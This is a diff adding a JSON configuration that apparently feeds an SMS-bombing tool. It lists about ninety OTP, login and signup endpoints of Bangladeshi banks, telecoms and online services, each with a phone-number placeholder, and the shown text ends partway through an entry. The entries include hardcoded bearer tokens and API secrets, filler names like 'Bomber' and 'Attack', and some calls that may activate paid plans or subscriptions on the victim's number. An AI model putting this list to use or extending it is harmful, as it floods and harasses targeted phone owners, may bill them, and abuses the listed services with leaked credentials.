@@ -1,0 +1,1097 @@
+{
+  "apis": [
+    {
+      "name": "QuizGiri",
+      "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
+      "method": "post",
+      "body": "{\"country_code\":\"+88\",\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Shudokko",
+      "url": "http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/",
+      "method": "get",
+      "body": "",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Web Access",
+      "url": "http://27.131.15.19/lstyle/api/lsotprequest",
+      "method": "post",
+      "body": "{\"shortcode\":\"2494905\",\"msisdn\":\"88{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "CINESPOT",
+      "url": "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-{{phone}}/operator-All/send",
+      "method": "get",
+      "body": "",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      }
+    },
+    {
+      "name": "Dhaka Bank",
+      "url": "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
+      "method": "post",
+      "body": "{\"AccessToken\": \"\",\"TrackingNo\": \"\",\"mobileNo\": \"{{phone}}\",\"otpSms\": \"\",\"product_id\": \"250\",\"requestChannel\": \"MOB\",\"trackingStatus\": 5}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Circle",
+      "url": "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88{{phone}}",
+      "method": "post",
+      "body": "",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Health Plus",
+      "url": "http://45.114.85.19:8080/v3/otp/send?msisdn=88{{phone}}",
+      "method": "get",
+      "body": "",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "IQRA",
+      "url": "http://apibeta.iqra-live.com/api/v2/sent-otp/{{phone}}",
+      "method": "get",
+      "body": "",
+      "headers": {
+        "x-user-channel": "apps"
+      }
+    },
+    {
+      "name": "Shajgoj",
+      "url": "https://shop.shajgoj.com/wp-admin/admin-ajax.php",
+      "method": "post",
+      "body": "action=xoo_ml_login_with_otp&xoo-ml-phone-login={{phone}}&xoo-ml-form-token=4840&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      }
+    },
+    {
+      "name": "KhaoDao",
+      "url": "https://api.eat-z.com/auth/customer/signin",
+      "method": "post",
+      "body": "{\"username\":\"+88{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "ALESHA_CARD",
+      "url": "https://aleshacard.com/api/register-otp?contact_no={{phone}}",
+      "method": "post",
+      "body": "",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "TheMallBD",
+      "url": "https://themallbd.com/api/auth/otp_login",
+      "method": "post",
+      "body": "{\"phone_number\":\"+88{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Fundesh",
+      "url": "https://win.fundesh.com.bd/authSrv/auth/generateOtp",
+      "method": "post",
+      "body": "{\"msisdn\": \"{{phone}}\",\"clientId\": \"d2c_client\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Circle OTC",
+      "url": "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88{{phone}}",
+      "method": "post",
+      "body": "",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Vestige",
+      "url": "http://vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com/notification/api/v1/send/otp/v3",
+      "method": "post",
+      "body": "{\"mobileNumber\":\"88{{phone}}\",\"countryId\":22}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Ajkerdeal",
+      "url": "https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup=null",
+      "method": "post",
+      "body": "{\"CustomerId\": \"01833268701\",\"MobileOrEmail\":\"{{phone}}\", \"Type\": 2}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Arogga",
+      "url": "https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0",
+      "method": "post",
+      "body": "mobile=+88{{phone}}&fcmToken=&referral=",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "OsudPotro",
+      "url": "https://api-2.osudpotro.com/api/v1/users/send_otp",
+      "method": "post",
+      "body": "{\"mobile\":\"+88-{{phone}}\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Bongo",
+      "url": "https://api.bongo-solutions.com/auth/api/login/send-otp",
+      "method": "post",
+      "body": "{\"operator\":\"all\",\"msisdn\":\"88{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Cinematic",
+      "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{{phone}}",
+      "method": "post",
+      "body": "",
+      "headers": {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"
+      }
+    },
+    {
+      "name": "Ali2BD",
+      "url": "https://edge.ali2bd.com/api/consumer/v1/auth/login",
+      "method": "post",
+      "body": "{\"username\":\"+88{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Rabbitholebd",
+      "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
+      "method": "post",
+      "body": "{\"mobile\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      }
+    },
+    {
+      "name": "Shopoth",
+      "url": "https://api.shopoth.com/shop/api/v1/otps/send",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      }
+    },
+    {
+      "name": "Hoichoi",
+      "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
+      "method": "post",
+      "body": "{\"requestType\":\"send\",\"phoneNumber\":\"+88{{phone}}\",\"emailConsent\":true,\"whatsappConsent\":true}",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      }
+    },
+    {
+      "name": "Paperfly",
+      "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
+      "method": "post",
+      "body": "{\"full_name\":\"BLACKFIRE\",\"company_name\":\"Bomber\",\"email_address\":\"blactfiretools@gmail.com\",\"phone_number\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "BTCL MyBTCL",
+      "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
+      "method": "post",
+      "body": "{\"phoneNbr\": \"{{phone}}\", \"email\": \"\", \"OTPType\": 1, \"userName\": \"\"}",
+      "headers": {
+        "accept": "application/json",
+        "content-type": "application/json",
+        "origin": "https://mybtcl.btcl.gov.bd",
+        "referer": "https://mybtcl.btcl.gov.bd/register",
+        "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
+      }
+    },
+    {
+      "name": "Bioscope Plus",
+      "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
+      "method": "post",
+      "body": "{\"number\": \"+88{{phone}}\"}",
+      "headers": {
+        "accept": "application/json",
+        "content-type": "application/json",
+        "origin": "https://www.bioscopeplus.com",
+        "referer": "https://www.bioscopeplus.com/"
+      }
+    },
+    {
+      "name": "BD Tickets",
+      "url": "https://api.bdtickets.com:20100/v1/auth",
+      "method": "post",
+      "body": "{\"createUserCheck\": true, \"phoneNumber\": \"+88{{phone}}\", \"applicationChannel\": \"WEB_APP\"}",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://bdtickets.com",
+        "referer": "https://bdtickets.com/"
+      }
+    },
+    {
+      "name": "Apex4U",
+      "url": "https://api.apex4u.com/api/auth/login",
+      "method": "post",
+      "body": "{\"phoneNumber\": \"0{{phone}}\"}",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://apex4u.com",
+        "referer": "https://apex4u.com/"
+      }
+    },
+    {
+      "name": "Swap.com.bd",
+      "url": "https://api.swap.com.bd/api/v1/send-otp/v2",
+      "method": "post",
+      "body": "{\"phone\": \"0{{phone}}\"}",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://swap.com.bd",
+        "Referer": "https://swap.com.bd/"
+      }
+    },
+    {
+      "name": "Ilyn Global",
+      "url": "https://api.ilyn.global/auth/signup",
+      "method": "post",
+      "body": "{\"phone\": {\"code\": \"BD\", \"number\": \"+880{{phone}}\"}, \"provider\": \"sms\"}",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "appcode": "ilyn-bd",
+        "origin": "https://ilyn.global",
+        "referer": "https://ilyn.global/"
+      }
+    },
+    {
+      "name": "Arogga Web",
+      "url": "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=141.0.0.0&os=Windows&osv=10",
+      "method": "post",
+      "body": "mobile=0{{phone}}&fcmToken=&referral=",
+      "headers": {
+        "accept": "*/*",
+        "content-type": "application/x-www-form-urlencoded",
+        "origin": "https://www.arogga.com",
+        "referer": "https://www.arogga.com/"
+      }
+    },
+    {
+      "name": "Fundesh Web",
+      "url": "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
+      "method": "post",
+      "body": "{\"msisdn\": \"0{{phone}}\"}",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json; charset=UTF-8",
+        "origin": "https://fundesh.com.bd",
+        "referer": "https://fundesh.com.bd/fundesh/profile"
+      }
+    },
+    {
+      "name": "Garibook",
+      "url": "https://api.garibookadmin.com/api/v3/user/login",
+      "method": "post",
+      "body": "{\"mobile\": \"0{{phone}}\", \"recaptcha_token\": \"garibookcaptcha\", \"channel\": \"web\"}",
+      "headers": {
+        "accept": "application/json",
+        "content-type": "application/json",
+        "Origin": "https://garibook.com",
+        "Referer": "https://garibook.com/"
+      }
+    },
+    {
+      "name": "Sheba",
+      "url": "https://accountkit.sheba.xyz/api/shoot-otp",
+      "method": "post",
+      "body": "{\"mobile\": \"+88{{phone}}\", \"app_id\": \"8329815A6D1AE6DD\", \"api_token\": \"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH\"}",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json;charset=UTF-8",
+        "custom-headers": "{\"portal-name\": \"Customer Web\"}",
+        "origin": "https://www.sheba.xyz",
+        "referer": "https://www.sheba.xyz/"
+      }
+    },
+    {
+      "name": "AppLink",
+      "url": "https://apps.applink.com.bd/appstore-v4-server/login/otp/request",
+      "method": "post",
+      "body": "{\"msisdn\": \"88{{phone}}\"}",
+      "headers": {
+        "Accept": "*/*",
+        "Content-Type": "application/json",
+        "Origin": "https://applink.com.bd",
+        "Referer": "https://applink.com.bd/"
+      }
+    },
+    {
+      "name": "Bikroy",
+      "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0{{phone}}",
+      "method": "get",
+      "body": "",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "accept-language": "bn",
+        "application-name": "web",
+        "referer": "https://bikroy.com/?login-modal=true&redirect-url=/"
+      }
+    },
+    {
+      "name": "MyGP Cinematic Web",
+      "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/+88{{phone}}",
+      "method": "post",
+      "body": "",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json;charset=UTF-8",
+        "Origin": "https://cinematic.mobi",
+        "Referer": "https://cinematic.mobi/",
+        "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"
+      }
+    },
+    {
+      "name": "GP Web Login",
+      "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
+      "method": "post",
+      "body": "msisdn=0{{phone}}",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://www.grameenphone.com",
+        "Referer": "https://www.grameenphone.com/"
+      }
+    },
+    {
+      "name": "Ghoori Learning",
+      "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
+      "method": "post",
+      "body": "{\"mobile_no\": \"0{{phone}}\"}",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://ghoorilearning.com",
+        "referer": "https://ghoorilearning.com/"
+      }
+    },
+    {
+      "name": "Deepto Play",
+      "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
+      "method": "post",
+      "body": "{\"number\": \"+880{{phone}}\"}",
+      "headers": {
+        "accept": "application/json",
+        "content-type": "application/json",
+        "origin": "https://www.deeptoplay.com",
+        "referer": "https://www.deeptoplay.com/"
+      }
+    },
+    {
+      "name": "ePharma",
+      "url": "https://epharma.com.bd/authentication/send-otp",
+      "method": "post",
+      "body": "number=+88{{phone}}",
+      "headers": {
+        "accept": "*/*",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "origin": "https://epharma.com.bd",
+        "referer": "https://epharma.com.bd/",
+        "x-requested-with": "XMLHttpRequest"
+      }
+    },
+    {
+      "name": "Sailor Clothing",
+      "url": "https://backend.sailor.clothing/api/v2/auth/password/forget_request",
+      "method": "post",
+      "body": "{\"email_or_phone\": \"0{{phone}}\", \"send_code_by\": \"phone\"}",
+      "headers": {
+        "accept": "application/json",
+        "content-type": "application/json",
+        "authorization": "Bearer 5637987|3QACHH6dNkj2VMvQ6iJIPm5Ww8ML3pENjBgoChTr",
+        "origin": "https://sailor.clothing",
+        "referer": "https://sailor.clothing/"
+      }
+    },
+    {
+      "name": "Isho",
+      "url": "https://www.isho.com/register_otp",
+      "method": "post",
+      "body": "phone=0{{phone}}&email=test%40gmail.com",
+      "headers": {
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "content-type": "application/x-www-form-urlencoded",
+        "origin": "https://www.isho.com",
+        "referer": "https://www.isho.com/register"
+      }
+    },
+    {
+      "name": "MedEasy",
+      "url": "https://api.medeasy.health/api/send-otp/+88{{phone}}/,",
+      "method": "get",
+      "body": "",
+      "headers": {
+        "accept": "application/json",
+        "origin": "https://medeasy.health",
+        "referer": "https://medeasy.health/"
+      }
+    },
+    {
+      "name": "Osudpotro",
+      "url": "https://api.osudpotro.com/api/v1/users/send_otp",
+      "method": "post",
+      "body": "{\"mobile\": \"+88-{{phone}}\", \"deviceToken\": \"web\", \"language\": \"en\", \"os\": \"web\"}",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json;charset=UTF-8",
+        "authorization": "Bearer undefined",
+        "origin": "https://osudpotro.com",
+        "referer": "https://osudpotro.com/"
+      }
+    },
+    {
+      "name": "TheClinicall",
+      "url": "https://theclinicall.com/bkapi/auth/user/otp/signin",
+      "method": "post",
+      "body": "{\"countryCode\": \"BD\", \"dialCode\": \"880\", \"phone\": \"{{phone}}\"}",
+      "headers": {
+        "accept": "application/json",
+        "content-type": "application/json",
+        "authorization": "Bearer Hello",
+        "origin": "https://www.theclinicall.com",
+        "referer": "https://www.theclinicall.com/"
+      }
+    },
+    {
+      "name": "Shombhob",
+      "url": "https://shombhob.com/api/otp-login",
+      "method": "post",
+      "body": "{\"phone\": \"0{{phone}}\"}",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://shombhob.com",
+        "referer": "https://shombhob.com/userlogin",
+        "x-requested-with": "XMLHttpRequest"
+      }
+    },
+    {
+      "name": "Care Box",
+      "url": "https://www.api-care-box.click/api/user/register/?version=otp",
+      "method": "post",
+      "body": "{\"Name\": \"Rakib Khan\", \"Phone\": \"+880{{phone}}\"}",
+      "headers": {
+        "accept": "*/*",
+        "content-type": "application/json",
+        "origin": "https://www.care-box.com",
+        "referer": "https://www.care-box.com/"
+      }
+    },
+    {
+      "name": "Renix Care",
+      "url": "https://renixapi.renixcare.com/sms-api/send-otp",
+      "method": "post",
+      "body": "{\"phone\": \"0{{phone}}\"}",
+      "headers": {
+        "accept": "*/*",
+        "content-type": "application/json",
+        "origin": "https://renixcare.com",
+        "referer": "https://renixcare.com/"
+      }
+    },
+    {
+      "name": "Jayabaji",
+      "url": "https://www.jayabaji3.com/api/register/check-username",
+      "method": "post",
+      "body": "{\"username\": \"sojib12345\", \"email\": \"\", \"mobileno\": \"{{phone}}\", \"language\": \"bn\", \"langCountry\": \"bn-bd\"}",
+      "headers": {
+        "accept": "application/json",
+        "content-type": "application/json",
+        "device": "desktop",
+        "domain": "www.jayabaji3.com",
+        "lang": "bn-bd",
+        "origin": "https://www.jayabaji3.com",
+        "referer": "https://www.jayabaji3.com/bn-bd?signup=1"
+      }
+    },
+    {
+      "name": "PKLuck2",
+      "url": "https://www.pkluck2.com/wps/verification/sms/register",
+      "method": "post",
+      "body": "{\"countryDialingCode\": \"880\", \"mobileNo\": \"0{{phone}}\"}",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Device": "web",
+        "Language": "BN",
+        "Merchant": "pklubdtf4",
+        "Origin": "https://www.pkluck2.com",
+        "Referer": "https://www.pkluck2.com/"
+      }
+    },
+    {
+      "name": "GP Flexiplan",
+      "url": "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation",
+      "method": "post",
+      "body": "{\"payment_mode\": \"mobile_balance\", \"longevity\": 1, \"voice\": 100, \"data\": 0, \"fourg\": 0, \"bioscope\": 0, \"sms\": 0, \"mca\": 0, \"price\": 69, \"msisdn\": \"0{{phone}}\", \"bundle_id\": 60817, \"is_login\": false}",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Authorization": "Bearer null",
+        "Content-Type": "application/json",
+        "Origin": "https://www.grameenphone.com",
+        "Referer": "https://www.grameenphone.com/"
+      }
+    },
+    {
+      "name": "GP FWA",
+      "url": "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp",
+      "method": "post",
+      "body": "{\"phone\": \"0{{phone}}\", \"email\": \"\", \"language\": \"en\"}",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://gpfi.grameenphone.com",
+        "Referer": "https://gpfi.grameenphone.com/"
+      }
+    },
+    {
+      "name": "Mevrik",
+      "url": "https://channels.mevrik.com:4202/api/v1/claim-session",
+      "method": "post",
+      "body": "{\"data\": {\"user_ref\": \"0{{phone}}\", \"name\": \"MD Hossain\"}}",
+      "headers": {
+        "Accept": "application/json",
+        "Content-Type": "text/plain",
+        "Origin": "https://chat.mevrik.com:4213",
+        "Referer": "https://chat.mevrik.com:4213/",
+        "x-mevrik-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsImNoYW5uZWwiOiJncC13ZWJzaXRlIiwibXNpc2RuIjoiOTcxOEE3NTctNjUwOC00NUM0LThEQ0EtQTgxRDhGQUYyMkI2IiwiZGV2aWNlX2lkIjoiZ2VuZXJpYyIsImlhdCI6MTc1OTg2NTMwMSwiaXNzIjoibWV2cmlrLmNvbSIsImV4cCI6MTc1OTg2NzEwMSwiaHR0cHM6XC9cL21ldnJpay5jb21cL2p3dFwvY2xhaW1zIjp7IngtbWV2cmlrLWFsbG93ZWQtcm9sZXMiOlsidXNlciJdfX0.O6gms45yShqhy3tj7Z97vCrgXY5h1EWcPbIGpaJBlmE"
+      }
+    },
+    {
+      "name": "Priyoshikkhaloy",
+      "url": "https://app.priyoshikkhaloy.com/api/user/register-login.php",
+      "method": "post",
+      "body": "mobile=0{{phone}}",
+      "headers": {
+        "User-Agent": "okhttp/4.11.0",
+        "Accept-Encoding": "gzip",
+        "Content-Type": "application/x-www-form-urlencoded"
+      }
+    },
+    {
+      "name": "Robi Doorstep",
+      "url": "https://webapi.robi.com.bd/v1/send-otp",
+      "method": "post",
+      "body": "{\"phone_number\":\"{{phone}}\",\"type\":\"doorstep\"}",
+      "headers": {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc"
+      }
+    },
+    {
+      "name": "Banglalink Validation",
+      "url": "https://web-api.banglalink.net/api/v1/user/number/validation/{{phone}}",
+      "method": "get",
+      "body": "",
+      "headers": {}
+    },
+    {
+      "name": "Banglalink OTP",
+      "url": "https://web-api.banglalink.net/api/v1/user/otp-login/request",
+      "method": "post",
+      "body": "{\"mobile\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Grameenphone OTP",
+      "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
+      "method": "post",
+      "body": "msisdn={{phone}}",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      }
+    },
+    {
+      "name": "Robi My Offer",
+      "url": "https://webapi.robi.com.bd/v1/send-otp",
+      "method": "post",
+      "body": "{\"phone_number\":\"{{phone}}\",\"type\":\"my_offer\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Robi DA NLL",
+      "url": "https://da-api.robi.com.bd/da-nll/otp/send",
+      "method": "post",
+      "body": "{\"msisdn\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Robi Video Chat",
+      "url": "https://webapi.robi.com.bd/v1/chat/send-otp",
+      "method": "post",
+      "body": "{\"phone_number\":\"{{phone}}\",\"name\":\"BILLAVAI\",\"type\":\"video-chat\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Redx Merchant",
+      "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
+      "method": "post",
+      "body": "{\"phoneNumber\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Fundesh Generate",
+      "url": "https://fundesh.com.bd/api/auth/generateOTP",
+      "method": "post",
+      "body": "{\"msisdn\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Bikroy Phone",
+      "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={{phone}}",
+      "method": "get",
+      "body": "",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "application-name": "web"
+      }
+    },
+    {
+      "name": "Motionview",
+      "url": "https://api.motionview.com.bd/api/send-otp-phone-signup",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Chorki",
+      "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web",
+      "method": "post",
+      "body": "{\"number\":\"+88{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Jatri",
+      "url": "https://user-api.jslglobal.co:444/v2/send-otp",
+      "method": "post",
+      "body": "{\"phone\":\"+88{{phone}}\",\"jatri_token\":\"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "China Online",
+      "url": "https://chinaonlinebd.com/api/login/getOtp?phone={{phone}}",
+      "method": "get",
+      "body": "",
+      "headers": {
+        "token": "45601f3d391886fcec5f5a3f26780f21"
+      }
+    },
+    {
+      "name": "Deeptoplay",
+      "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web",
+      "method": "post",
+      "body": "{\"number\":\"+88{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Shikho",
+      "url": "https://api.shikho.com/auth/v2/send/sms",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\",\"type\":\"student\",\"auth_type\":\"signup\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Redx Signup",
+      "url": "https://api.redx.com.bd/v1/user/signup",
+      "method": "post",
+      "body": "{\"name\":\"Attack\",\"phoneNumber\":\"{{phone}}\",\"service\":\"redx\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Bioscopelive",
+      "url": "https://www.bioscopelive.com/en/login/send-otp?phone=88{{phone}}&operator=bd-otp",
+      "method": "get",
+      "body": "",
+      "headers": {}
+    },
+    {
+      "name": "Applink OTP",
+      "url": "https://applink.com.bd/appstore-v4-server/login/otp/request",
+      "method": "post",
+      "body": "{\"msisdn\":\"88{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Chokrojan",
+      "url": "https://chokrojan.com/api/v1/passenger/login/mobile",
+      "method": "post",
+      "body": "{\"mobile_number\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Easy Forgot",
+      "url": "https://core.easy.com.bd/api/v1/forgot-password-otp",
+      "method": "post",
+      "body": "{\"device_key\":\"2ea97d276a980993308116baa292cec9\",\"mobile\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Walton Plaza",
+      "url": "https://waltonplaza.com.bd/api/auth/otp/create",
+      "method": "post",
+      "body": "{\"auth\":{\"countryCode\":\"880\",\"deviceUuid\":\"ee757830-f639-12f0-9f4d-2f972746fhg\",\"phone\":\"{{phone}}\"},\"captchaToken\":\"recapcha\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Chardike",
+      "url": "https://api.chardike.com/api/otp/send",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\",\"otp_type\":\"login\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "BTCL Send",
+      "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
+      "method": "post",
+      "body": "{\"phoneNbr\":\"{{phone}}\",\"OTPType\":1.0,\"userName\":\"\",\"email\":\"\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "AWS OTP",
+      "url": "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Otithee",
+      "url": "https://gateway.otithee.com/api/v1/generate-otp",
+      "method": "post",
+      "body": "{\"request_type\":\"registration\",\"mobile_number\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Quizgiri Send",
+      "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp",
+      "method": "post",
+      "body": "{\"country_code\":\"+88\",\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Mojaru",
+      "url": "https://new.mojaru.com/api/student/login",
+      "method": "post",
+      "body": "{\"mobile_or_email\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "GP AppCity",
+      "url": "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
+      "method": "post",
+      "body": "{\"mobileNumber\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Qcoom",
+      "url": "https://auth.qcoom.com/api/v1/otp/send",
+      "method": "post",
+      "body": "{\"mobileNumber\":\"+88{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Circle Reseller",
+      "url": "https://reseller.circle.com.bd/api/v2/auth/signup",
+      "method": "post",
+      "body": "{\"name\":\"+88{{phone}}\",\"email_or_phone\":\"+88{{phone}}\",\"password\":\"123456\",\"password_confirmation\":\"123456\",\"register_by\":\"phone\"}",
+      "headers": {
+        "Content-Type": "application/json"
+      }
+    },
+    {
+      "name": "Shomvob",
+      "url": "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0",
+      "method": "post",
+      "body": "{\"phone\":\"{{phone}}\"}",
+      "headers": {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"
+      }
+    },
+    {
+      "name": "Toybox",
+      "url": "https://api.toybox.live/bdapps_handler.php",
+      "method": "post",
+      "body": "Operation=CreateSubscription&MobileNumber=88{{phone}}&PackageID=100&Secret=HJKX71%UHYH",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      }
+    },
+    {
+      "name": "Win2gain",
+      "url": "https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{{phone}}",
+      "method": "get",
+      "body": "",
+      "headers": {
+        "sourcePlatform": "web",
+        "client": "2"
+      }
+    },
+    {
+      "name": "BD Kepler",
